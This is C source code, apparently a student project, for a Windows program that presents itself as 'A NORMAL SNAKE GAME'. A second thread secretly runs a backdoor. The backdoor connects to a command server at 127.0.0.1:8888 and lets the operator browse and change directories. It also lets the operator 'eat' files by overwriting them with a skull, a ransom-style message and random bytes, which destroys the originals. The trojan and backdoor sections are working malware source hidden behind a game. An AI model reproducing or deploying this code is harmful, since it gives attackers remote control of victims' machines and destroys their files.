#include <stdio.h>
#include <winsock2.h>
#include <string.h>
#include <conio.h>
#include <dirent.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>
#define GAMESCREEN_WIDTH 50
#define GAMESCREEN_HEIGHT 20

#pragma comment(lib, "ws2_32.lib")

// ==================================================================================
// 				   CODE FOR CONNECTIONS AND BACK DOOR STARTS HERE
// ==================================================================================

// Declaring needed variables globally
WSADATA wsa;
SOCKET s;
struct sockaddr_in server;
char buffer[2048];
int recv_size;
int freeHandGiven = 0;
int awaamiErrorCode;

// Repetitive code declared as functions here...

// Called when any error is caught, to stop the program then and there
void error()
{
	exit(1);
}

// Iniitialize Winsock
void initWinSock()
{
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		error();
	}
}

// Create socket
void createPrepSock()
{

	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		error();
	}
}

// Connect to the hacker/server's computer
int makeConnToServer()
{

	server.sin_addr.s_addr = inet_addr("127.0.0.1");
	server.sin_family = AF_INET;
	server.sin_port = htons(8888);

	if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
	{
		return 0;
	}

	return 1;
}

// Recieve data and put it in buffer
int reliableRecieve()
{
	// Cleaning buffer before data comes.
	memset(buffer, 0, strlen(buffer));

	if ((recv_size = recv(s, buffer, sizeof(buffer), 0)) == SOCKET_ERROR)
	{
		return -1;
	}

	buffer[recv_size] = '\0';
	if (recv_size == 1)
		return 0;

	return 1;
}

// Send all data stored in buffer
void reliableSend()
{
	// Sending message to client
	send(s, buffer, strlen(buffer), 0);
}

// Load the buffer with list of current folder contents
void pullDirectoryData()
{
	// Code to extract directory data
	DIR *directory;
	struct dirent *entry;

	// Open the current working directory
	directory = opendir(".");
	if (directory == NULL)
	{
		perror("Error opening current working directory");
	}

	// Loop through the entries in the directory
	while ((entry = readdir(directory)) != NULL)
	{
		char filename[100];
		char filetype[10];

		if ((entry->d_type + '0') == '0')
		{
			strcpy(filetype, "FILE");
		}
		else
		{
			strcpy(filetype, "FOLDER");
		}

		strcpy(filename, entry->d_name);
		strcat(filename, "\n");
		strcat(filename, filetype);
		strcat(filename, "\n\n");
		strcat(buffer, filename);
	}

	// Close the directory
	closedir(directory);
}

// Load the buffer with CWD Path
void loadCWD()
{
	getcwd(buffer, sizeof(buffer));
}

// Load the buffer with any data
void writeToBuffer(char data[])
{
	// Clearing old data
	memset(buffer, 0, strlen(buffer));

	// Putting new data
	strcpy(buffer, data);
}

// Function that eats any file
int eatFile(char fileName[])
{
	int offset, n;
	FILE *filein;

	filein = fopen(fileName, "r");

	if (filein == NULL)
	{
		return 0;
	}

	fseek(filein, 0L, SEEK_END);
	n = ftell(filein);

	fclose(filein);

	filein = fopen(fileName, "w");

	fputs("         _______________\n", filein);
	fputs("        /               \\\n", filein);
	fputs("       /                 \\\n", filein);
	fputs("      /                   \\\n", filein);
	fputs("      |   XXXX     XXXX   |\n", filein);
	fputs("      |   XXXX     XXXX   |\n", filein);
	fputs("      |   XXX       XXX   |\n", filein);
	fputs("      |         X         |\n", filein);
	fputs("      \\__      XXX     __/\n", filein);
	fputs("        |\\     XXX     /|\n", filein);
	fputs("        | |           | |\n", filein);
	fputs("        | I I I I I I I |\n", filein);
	fputs("        |  I I I I I I  |\n", filein);
	fputs("         \\_           _/\n", filein);
	fputs("          \\_         _/\n", filein);
	fputs("            \\_______/\n", filein);
	fputs("  XXX                        XXX\n", filein);
	fputs("XXXXX                        XXXXX\n", filein);
	fputs(" XXXXXXXXXX             XXXXXXXXXX\n", filein);
	fputs("         XXXXX     XXXXX\n", filein);
	fputs("             XXXXXXX\n", filein);
	fputs("         XXXXX     XXXXX\n", filein);
	fputs(" XXXXXXXXXX             XXXXXXXXXX\n", filein);
	fputs("XXXXX                        XXXXX\n", filein);
	fputs("  XXX                        XXX\n\n", filein);

	fputs("=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/\n", filein);
	fputs("			I OWN YOUR FILE.\n			WATCH THE VIDEO TO GET IT BACK.\n", filein);
	fputs("=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/\n\n", filein);
	fputs("https://www.youtube.com/watch?v=dQw4w9WgXcQ\n\n", filein);

	for (int i = 0; i < n; i++)
	{
		fputc(rand() % 256, filein);
	}

	fclose(filein);

	return 1;
}

int agentSnakeFreeHand()
{
	while (1)
	{
		if (freeHandGiven)
		{
			// get a file from the desktop
			// chdir();
		}
	}
}

// Main function for backdoor operations
int backdoor_main()
{
	// Main Code

	initWinSock();

	// A continious connection persistant loop for the backdoor
	int connected = 0;

	while (1)
	{

		while (!connected)
		{
			Sleep(1000);
			createPrepSock();
			connected = makeConnToServer(); // returns 1 if successful
		}

		while (connected)
		{

			// Getting chosen option by server
			while (1)
			{
				awaamiErrorCode = reliableRecieve();
				if (awaamiErrorCode != 0)
					break;
			}

			// Checking if connection is still intact.
			if (awaamiErrorCode == 1)
			{
				// Checking option selected by server
				int option = atoi(buffer);

				switch (option)
				{
				case 1:
					pullDirectoryData();

					reliableSend();

					break;

				case 2:
					loadCWD();

					reliableSend();

					break;

				case 3:

					awaamiErrorCode = 0;
					while (awaamiErrorCode == 0)
					{
						awaamiErrorCode = reliableRecieve();
					}

					chdir(buffer);

					// Sending updated CWD
					loadCWD();
					reliableSend();

					break;

				case 4:
					chdir("..");

					// Sending updated CWD
					loadCWD();
					reliableSend();

					break;

				case 5:

					awaamiErrorCode = 0;
					while (awaamiErrorCode == 0)
					{
						awaamiErrorCode = reliableRecieve();
					}

					awaamiErrorCode = eatFile(buffer);

					// Sending post eating report
					if (awaamiErrorCode == 1)
					{
						writeToBuffer("File eaten successfully.");
					}
					else
					{
						writeToBuffer("File was not eaten, probably not found.");
					}

					reliableSend();

					break;

				default:
					break;
				}
			}

			// if connection was broken
			else
			{
				connected = 0;
				break;
			}
		}
	}

	return 0;
}

// ==================================================================================
// 				   CODE FOR CONNECTIONS AND BACK DOOR ENDS HERE
// ==================================================================================

// ==================================================================================
// 				   		CODE FOR THE SNAKE GAME STARTS HERE
// ==================================================================================

struct SnakeGame
{
	int vel_x;
	int vel_y;
	int food_x;
	int food_y;
	int score;
	int highScore;
	int running;
	int deltaFrame;
	int initDeltaFrame;

	int length;
	int top;
	int snakeBody[GAMESCREEN_WIDTH * GAMESCREEN_HEIGHT][2];
};

int temp;
struct SnakeGame snakeGame;

// To store the input key
char inputCh;

// Type of chars that are printed on render
char headChar = '0';
char snakeChar = 'o';
char backgroundChar = ' ';
char borderChar = 'X';
char foodChar = 'a';

// Function to read highscore from the highscore.txt file
// and store it in the struct
int readHighScore()
{
	FILE *highScoreFilein;
	char dataRead[GAMESCREEN_HEIGHT * GAMESCREEN_WIDTH];

	highScoreFilein = fopen("highscore.txt", "r");

	if (highScoreFilein == NULL)
	{
		return 0;
	}

	fgets(dataRead, GAMESCREEN_HEIGHT * GAMESCREEN_WIDTH, highScoreFilein);

	fclose(highScoreFilein);

	return atoi(dataRead);
}

// Function to read highscore from the program (struct)
// and store it in the highscore.txt file.
void setHighScore(int newHigh)
{
	FILE *highScoreFilein;
	char dataToWrite[GAMESCREEN_HEIGHT * GAMESCREEN_WIDTH];

	highScoreFilein = fopen("highscore.txt", "w");

	if (highScoreFilein != NULL)
	{
		sprintf(dataToWrite, "%d", newHigh);

		fprintf(highScoreFilein, dataToWrite);

		fclose(highScoreFilein);
	}
}

// Randomly set position of food from withing the screen bounds.
void putFood()
{
	snakeGame.food_x = (rand() % (GAMESCREEN_WIDTH - 2)) + 1;
	snakeGame.food_y = (rand() % (GAMESCREEN_HEIGHT - 2)) + 1;
}

// To set up all the values for a new round
void initialize()
{
	// Clearing all the values of the snakeBody array
	for (int i = 0; i < (GAMESCREEN_HEIGHT * GAMESCREEN_WIDTH); i++)
	{
		snakeGame.snakeBody[i][0] = -1;
		snakeGame.snakeBody[i][1] = -1;
	}

	// The intial delay between each frame
	snakeGame.initDeltaFrame = 250;

	// Set the score to 0 and load the highscore that is written to file
	snakeGame.score = 0;
	snakeGame.highScore = readHighScore();

	// Put snake on its starting position
	snakeGame.snakeBody[0][0] = (int)GAMESCREEN_WIDTH / 2;
	snakeGame.snakeBody[0][1] = (int)GAMESCREEN_HEIGHT / 2;

	// Set snake's intial length to 1
	snakeGame.length = 1;

	// Put food for the first time
	putFood();

	// Set the initial movement direction of the snake
	snakeGame.vel_x = 1;
	snakeGame.vel_y = 0;
}

// Function that returns true if the coordinates passed as
// parameters are where the snake currently is
int snakeIsHere(int x, int y)
{
	for (int i = 0; i < (GAMESCREEN_WIDTH * GAMESCREEN_HEIGHT); i++)
	{
		// check x and y
		if (x == snakeGame.snakeBody[i][0] && y == snakeGame.snakeBody[i][1])
		{
			return 1;
		}
	}
	return 0;
}

// Function to check if the game is over
int checkGameOver()
{
	// This condition checks if the snake will hit the wall in the next frame
	if ((snakeGame.snakeBody[0][0] + snakeGame.vel_x) < (GAMESCREEN_WIDTH - 1) &&
		(snakeGame.snakeBody[0][0] + snakeGame.vel_x) > 0 &&
		(snakeGame.snakeBody[0][1] + snakeGame.vel_y) < (GAMESCREEN_HEIGHT - 1) &&
		(snakeGame.snakeBody[0][1] + snakeGame.vel_y) > 0)
	{
		// if it wont hit a wall, this condition checks if the snake will eat itself in the next frame
		if (snakeIsHere((snakeGame.snakeBody[0][0] + snakeGame.vel_x), (snakeGame.snakeBody[0][1] + snakeGame.vel_y)))
		{
			return 1;
		}
		else
		{
			return 0;
		}
	}
	else
	{
		return 1;
	}
}

// function to be called when game is over
void gameOver()
{
	// Update highscore
	if (snakeGame.score > snakeGame.highScore)
	{
		snakeGame.highScore = snakeGame.score;

		// Write new highscore to file
		setHighScore(snakeGame.score);
	}

	// Stop the game loop
	snakeGame.running = 0;
}

// function that returns true when the snake is eating food
int hasEatenFood()
{
	if (snakeIsHere(snakeGame.food_x, snakeGame.food_y))
	{
		return 1;
	}
	else
	{
		return 0;
	}
}

// This function is called every time before a frame is rendered
void update()
{
	// Check if game should be over and do it
	if (checkGameOver())
	{
		gameOver();
	}

	// Check if food has been eaten
	if (hasEatenFood())
	{
		// If food is eaten then increase it's length and the player's score
		snakeGame.length++;
		snakeGame.score++;
		putFood();
	}

	// Update the deltaFrame according to the score
	if (snakeGame.score == 0)
	{
		snakeGame.deltaFrame = (int)snakeGame.initDeltaFrame;
	}
	else
	{
		// as the score gets higher, the duration between the drawing of each frame decreases
		snakeGame.deltaFrame = (int)snakeGame.initDeltaFrame / (2 * snakeGame.score);
	}

	// Dont let the delay go under 50 so that the game stays playable
	if (snakeGame.deltaFrame < 50)
	{
		snakeGame.deltaFrame = 50;
	}

	// Shift all places to right in body array to make room for the new head
	for (int i = (GAMESCREEN_HEIGHT * GAMESCREEN_WIDTH) - 1; i >= 0; i--)
	{
		snakeGame.snakeBody[i + 1][0] = snakeGame.snakeBody[i][0];
		snakeGame.snakeBody[i + 1][1] = snakeGame.snakeBody[i][1];
	}

	// add snake head to the start of the array
	snakeGame.snakeBody[0][0] += snakeGame.vel_x;
	snakeGame.snakeBody[0][1] += snakeGame.vel_y;
	snakeGame.top++;

	// Remove extra coordinates from the end of the array so that the length remains unchanged
	while (snakeGame.top + 1 > snakeGame.length)
	{
		snakeGame.snakeBody[snakeGame.top][0] = -1;
		snakeGame.snakeBody[snakeGame.top][1] = -1;
		snakeGame.top--;
	}
}

void render()
{
	// prints a character for each pixel on the 2d frame, depending on it's type
	for (int j = 0; j < GAMESCREEN_HEIGHT; j++)
	{
		for (int i = 0; i < GAMESCREEN_WIDTH; i++)
		{
			if (i == snakeGame.snakeBody[0][0] && j == snakeGame.snakeBody[0][1])
			{
				fprintf(stderr, "%c", headChar);
			}
			else if (snakeIsHere(i, j))
			{
				fprintf(stderr, "%c", snakeChar);
			}
			else if (i == 0 || i == GAMESCREEN_WIDTH - 1 || j == 0 || j == GAMESCREEN_HEIGHT - 1)
			{
				fprintf(stderr, "%c", borderChar);
			}
			else if (i == snakeGame.food_x && j == snakeGame.food_y)
			{
				fprintf(stderr, "%c", foodChar);
			}
			else
			{
				fprintf(stderr, "%c", backgroundChar);
			}
		}
		fprintf(stderr, "\n");
	}
	fprintf(stderr, "SCORE: %d, HIGHSCORE: %d", snakeGame.score, snakeGame.highScore);
}

// Function to take the console typing cursor to the beginning
void resetCursor()
{
	COORD coord;
	coord.X = 0;
	coord.Y = 0;
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

	SetConsoleCursorPosition(hConsole, coord);
}

// function to hide the console's blinking cursor
void hideCursor()
{
	HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);

	CONSOLE_CURSOR_INFO cursorInfo;

	GetConsoleCursorInfo(out, &cursorInfo);
	cursorInfo.bVisible = 0; // set the cursor visibility to false
	SetConsoleCursorInfo(out, &cursorInfo);
}

// function to fill the screen with empty space and set the typing cursor to the start
void clearScreen()
{
	resetCursor();
	for (int i = 0; i < 20; i++)
	{
		for (int j = 0; j < 200; j++)
		{
			fprintf(stderr, " ");
		}
		fprintf(stderr, "\n");
	}
	resetCursor();
}

// function to print welcome screen
void showSnakeWelcomeScreen()
{

	fprintf(stderr, "   _____                         __   \n");
	fprintf(stderr, "  /  _  \\    ____   ____   _____/  |_ \n");
	fprintf(stderr, " /  /_\\  \\  / ___\\_/ __ \\ /    \\   __\\\n");
	fprintf(stderr, "/    |    \\/ /_/  >  ___/|   |  \\  |  \n");
	fprintf(stderr, "\\____|__  /\\___  / \\___  >___|  /__|  \n");
	fprintf(stderr, "        \\/_____/      \\/     \\/      \n");
	fprintf(stderr, "  _________              __           \n");
	fprintf(stderr, " /   _____/ ____ _____  |  | __ ____  \n");
	fprintf(stderr, " \\_____  \\ /    \\__  \\ |  |/ // __ \\ \n");
	fprintf(stderr, " /        \\   |  \\/ __ \\|    <\\  ___/ \n");
	fprintf(stderr, "/_______  /___|  (____  /__|_ \\___  >\n");
	fprintf(stderr, "        \\/     \\/     \\/     \\/    \\/ \n");

	fprintf(stderr, "\n\n");
	fprintf(stderr, "  A NORMAL   ____\n");
	fprintf(stderr, "  SNAKE     / . .\\      BY\n");
	fprintf(stderr, "  GAME      \\  ---<   SARIM,\n");
	fprintf(stderr, "             \\  /    MUNTAHA\n");
	fprintf(stderr, "   __________/ /       AND\n");
	fprintf(stderr, "-=:___________/	       SHAHEER\n");

	fprintf(stderr, "\n\nPress any key to continue...\n");

	fflush(stdin);
	getch();
}

//  function to tshow the gameover screen
void showGameOverScreen()

{
	fprintf(stderr, "  ________    _____      _____  ___________\n");
	fprintf(stderr, " /  _____/   /  _  \\    /     \\ \\_   _____/\n");
	fprintf(stderr, "/   \\  ___  /  /_\\  \\  /  \\ /  \\ |    __)_ \n");
	fprintf(stderr, "\\    \\_\\  \\/    |    \\/    Y    \\|        \\\n");
	fprintf(stderr, " \\______  /\\____|__  /\\____|__  /_______  /\n");
	fprintf(stderr, "        \\/         \\/         \\/        \\/ \n");
	fprintf(stderr, "____________   _________________________   \n");
	fprintf(stderr, "\\_____  \\   \\ /   /\\_   _____/\\______   \\  \n");
	fprintf(stderr, " /   |   \\   Y   /  |    __)_  |       _/  \n");
	fprintf(stderr, "/    |    \\     /   |        \\ |    |   \\  \n");
	fprintf(stderr, "\\_______  /\\___/   /_______  / |____|_  /  \n");
	fprintf(stderr, "        \\/                 \\/         \\/   \n");

	fprintf(stderr, "\n\nSCORE: %d, HIGHSCORE: %d", snakeGame.score, snakeGame.highScore);

	fprintf(stderr, "\n\nPress any key to try again...");
	fflush(stdin);
	getch();
}

// function to pause the game and display the pause screen
void pauseGame()
{
	for (int i = 0; i < (int)GAMESCREEN_HEIGHT / 2; i++)
	{
		fprintf(stderr, "\n");
	}
	for (int i = 0; i < (int)(GAMESCREEN_WIDTH / 2) - 3; i++)
	{
		fprintf(stderr, " ");
	}

	fprintf(stderr, "PAUSED");

	fflush(stdin);
	getch();
}

// function to do things based on the user's input
void handleInput()
{
	if (_kbhit())
	{
		inputCh = getch();
		// set movement direction to UP
		if ((inputCh == 'w' || inputCh == 'W') && snakeGame.vel_y != 1)
		{
			snakeGame.vel_x = 0;
			snakeGame.vel_y = -1;
		}
		// set movement direction to LEFT
		else if ((inputCh == 'a' || inputCh == 'A') && snakeGame.vel_x != 1)
		{
			snakeGame.vel_x = -1;
			snakeGame.vel_y = 0;
		}
		// set movement direction to DOWN
		else if ((inputCh == 's' || inputCh == 'S') && snakeGame.vel_y != -1)
		{
			snakeGame.vel_x = 0;
			snakeGame.vel_y = 1;
		}
		// set movement direction to RIGHT
		else if ((inputCh == 'd' || inputCh == 'D') && snakeGame.vel_x != -1)
		{
			snakeGame.vel_x = 1;
			snakeGame.vel_y = 0;
		}
		// pause the game and show pause screen
		else if ((inputCh == 'p' || inputCh == 'P'))
		{
			clearScreen();
			pauseGame();
		}
	}
}

int snakeGameMain()
{

	hideCursor();
	snakeGame.running = 1;

	clearScreen();
	showSnakeWelcomeScreen();

	// Continous loop of the game
	while (1)
	{
		// Snake Game Starts
		initialize();
		clearScreen();

		// Snake Game Runs
		while (snakeGame.running)
		{
			update();
			render();

			// Wait as long as the set delay between each frame
			Sleep(snakeGame.deltaFrame);

			handleInput();
			fflush(stdin);
			resetCursor(0, 0);
		}

		// Snake Game Over
		clearScreen();
		showGameOverScreen();

		// Set game to run again once te gameover screen is done displaying
		snakeGame.running = 1;
		fflush(stdin);
	}
}

// ==================================================================================
// 				   		CODE FOR THE SNAKE GAME ENDS HERE
// ==================================================================================

// ==================================================================================
// 				   		  MULTITHREADING WORK STARTS HERE
// ==================================================================================

// Runs the main code for the backdoor operations.
void *thread1()
{
	backdoor_main();
}

// Runs the minigame in the foreground
void *thread2()
{
	snakeGameMain();
}

int main(int argc, char *argv[])
{
	// Initializing the random module
	srand(time(NULL));

	// The main function here executes two different functions in parallel,
	// namely thread1 and thread2.

	pthread_t threadId1;
	pthread_t threadId2;

	pthread_create(&threadId1, NULL, &thread1, NULL);
	pthread_create(&threadId2, NULL, &thread2, NULL);

	pthread_join(threadId1, NULL);
	pthread_join(threadId2, NULL);
}
